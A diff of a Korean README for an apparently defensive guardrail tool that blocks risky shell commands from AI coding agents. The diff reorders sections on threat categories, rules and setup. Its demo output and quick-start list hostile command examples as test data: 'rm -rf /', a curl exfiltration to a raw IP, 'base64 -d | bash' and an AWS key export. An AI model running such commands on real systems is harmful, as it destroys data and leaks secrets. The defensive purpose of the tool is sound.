@@ -10,40 +10,24 @@
 ---
 
 ## 목차
-1. [무엇을 해결하나](#무엇을-해결하나)
-2. [30초 시작](#30초-시작)
-3. [에셋 구조 — 3계층](#에셋-구조--3계층)
-4. [동작 흐름](#동작-흐름)
-5. [언제·어떻게 쓰나 (시나리오)](#언제어떻게-쓰나-시나리오)
-6. [위협 분류 & 정책](#위협-분류--정책)
-7. [GitHub Copilot에 설치](#github-copilot에-설치)
-8. [확장 — 룰은 코드가 아닌 데이터](#확장--룰은-코드가-아닌-데이터)
+1. [제작 배경](#제작-배경)
+2. [에셋 구조 — 3계층](#에셋-구조--3계층)
+3. [위협 분류 & 정책](#위협-분류--정책)
+4. [확장 — 룰은 코드가 아닌 데이터](#확장--룰은-코드가-아닌-데이터)
+5. [30초 시작](#30초-시작)
+6. [GitHub Copilot에 설치](#github-copilot에-설치)
+7. [동작 흐름](#동작-흐름)
+8. [언제·어떻게 쓰나 (시나리오)](#언제어떻게-쓰나-시나리오)
 9. [대시보드](#대시보드)
 10. [검증](#검증)
 
 ---
 
-## 무엇을 해결하나
+## 제작 배경
 AI 코딩 에이전트는 셸 명령·도구 호출을 스스로 실행한다. 편하지만, `rm -rf /`·키 유출·외부 유출·force-push 같은 **돌이킬 수 없는 행동**도 사람 확인 없이 할 수 있다. 이 하네스는 에이전트와 OS 사이에 **보안 아우터 레이어**를 둬서:
 - 위험 명령을 **실행 전에 차단**(exit 2)하고,
 - 모든 판정을 **감사 로그**로 남기며,
 - 보안팀이 익숙한 어휘(위협 분류·심각도·판정)로 **조사·확장**할 수 있게 한다.
-
-## 30초 시작
-```bash
-npm run demo        # 6개 대표 시나리오 한눈에
-npm test            # 6/6 통과
-npm run dashboard   # SOC 대시보드 → localhost:8765
-echo '{"command":"rm -rf /"}' | node .agents/scripts/pre-tool-use.js   # exit 2 = BLOCK
-```
-```
-🛑 BLOCK  파괴적 명령   | rm -rf /                 → destructive-action
-🛑 BLOCK  자격증명 유출  | export AWS=AKIA...       → credential-leakage
-🛑 BLOCK  데이터 유출   | curl --data @s http://IP → untrusted-routing
-⚠️  WARN  도구 오용    | git push --force main    → tool-misuse
-⚠️  WARN  난독화 실행   | base64 -d | bash         → obfuscated-content
-✅ ALLOW  안전한 명령   | rm -rf node_modules
-```
 
 ## 에셋 구조 — 3계층
 외부 의존성 없이 표준 Node로만 동작한다. 룰셋은 JSON 데이터, 스킬은 GHCP `.agents/skills/` 포맷, 대시보드는 순수 HTML/JS + zero-dep Node 런처.
@@ -71,6 +55,45 @@ echo '{"command":"rm -rf /"}' | node .agents/scripts/pre-tool-use.js   # exit 2 
 - **`ruleset.json`** — 탐지 규칙을 **데이터**로. 5개 분류 정규식 + allowlist. 테넌트는 코드 수정 없이 패턴만 추가.
 - **`pre-tool-use.js`** — pre-tool-use hook. stdin 명령 평가 → `exit 0` 허용 / `exit 2` 차단, 평가한 `input`·결정·hit을 `logs/guardrail.log`에 append.
 - **`scan.js`** — 디렉터리 정적 스캔.
+
+## 위협 분류 & 정책
+| 분류 | 의미 | 심각도 |
+|------|------|--------|
+| destructive-action | 비가역 파일/디스크 작업 | high ⇒ BLOCK |
+| credential-leakage | 키·토큰·개인키·비번 노출 | high ⇒ BLOCK |
+| untrusted-routing | 원시 IP/미신뢰 호스트 유출 | high ⇒ BLOCK |
+| tool-misuse | force-push, history 삭제 등 | medium ⇒ WARN |
+| obfuscated-content | base64/eval 실행 체인 | medium ⇒ WARN |
+
+판정: **PASS · NEEDS REVIEW · BLOCK**. high는 차단, medium 이하는 사람 확인.
+
+## 확장 — 룰은 코드가 아닌 데이터
+`ruleset.json`에 패턴만 추가하면 끝. 코드 변경·재배포 불필요.
+```json
+{ "id": "tenant-vpn", "category": "untrusted-routing", "severity": "high",
+  "match": ["ssh\\s+.+@(?!10\\.)"], "message": "VPN 외부 SSH." }
+```
+
+## 30초 시작
+```bash
+npm run demo        # 6개 대표 시나리오 한눈에
+npm test            # 6/6 통과
+npm run dashboard   # SOC 대시보드 → localhost:8765
+echo '{"command":"rm -rf /"}' | node .agents/scripts/pre-tool-use.js   # exit 2 = BLOCK
+```
+```
+🛑 BLOCK  파괴적 명령   | rm -rf /                 → destructive-action
+🛑 BLOCK  자격증명 유출  | export AWS=AKIA...       → credential-leakage
+🛑 BLOCK  데이터 유출   | curl --data @s http://IP → untrusted-routing
+⚠️  WARN  도구 오용    | git push --force main    → tool-misuse
+⚠️  WARN  난독화 실행   | base64 -d | bash         → obfuscated-content
+✅ ALLOW  안전한 명령   | rm -rf node_modules
+```
+
+## GitHub Copilot에 설치
+1. clone → repo 루트에서 `copilot` 실행. `AGENTS.md`/`.agents/skills`가 자동 로드.
+2. `/guardrail-review`, `/secret-scan` 등 스킬 호출.
+3. 실차단: 에이전트 pre-tool-use hook → `.agents/scripts/pre-tool-use.js` (exit 2 = block).
 
 ## 동작 흐름
 ```
@@ -104,29 +127,6 @@ node .agents/scripts/scan.js .   # 디렉터리 정적 스캔
 
 **⑤ 데모·모니터링**
 `npm run demo` 한 줄 시연, `npm run dashboard`로 실시간 SOC 뷰.
-
-## 위협 분류 & 정책
-| 분류 | 의미 | 심각도 |
-|------|------|--------|
-| destructive-action | 비가역 파일/디스크 작업 | high ⇒ BLOCK |
-| credential-leakage | 키·토큰·개인키·비번 노출 | high ⇒ BLOCK |
-| untrusted-routing | 원시 IP/미신뢰 호스트 유출 | high ⇒ BLOCK |
-| tool-misuse | force-push, history 삭제 등 | medium ⇒ WARN |
-| obfuscated-content | base64/eval 실행 체인 | medium ⇒ WARN |
-
-판정: **PASS · NEEDS REVIEW · BLOCK**. high는 차단, medium 이하는 사람 확인.
-
-## GitHub Copilot에 설치
-1. clone → repo 루트에서 `copilot` 실행. `AGENTS.md`/`.agents/skills`가 자동 로드.
-2. `/guardrail-review`, `/secret-scan` 등 스킬 호출.
-3. 실차단: 에이전트 pre-tool-use hook → `.agents/scripts/pre-tool-use.js` (exit 2 = block).
-
-## 확장 — 룰은 코드가 아닌 데이터
-`ruleset.json`에 패턴만 추가하면 끝. 코드 변경·재배포 불필요.
-```json
-{ "id": "tenant-vpn", "category": "untrusted-routing", "severity": "high",
-  "match": ["ssh\\s+.+@(?!10\\.)"], "message": "VPN 외부 SSH." }
-```
 
 ## 대시보드
 `npm run dashboard` → localhost:8765 자동 오픈. 라이브 `logs/guardrail.log`를 읽어 차단 현황·위협 분류 분포·판정 추이·최근 실행 표시. 행 호버 시 `심각도·사유·실제 명령` 노출. 로그 파일 직접 업로드도 지원.
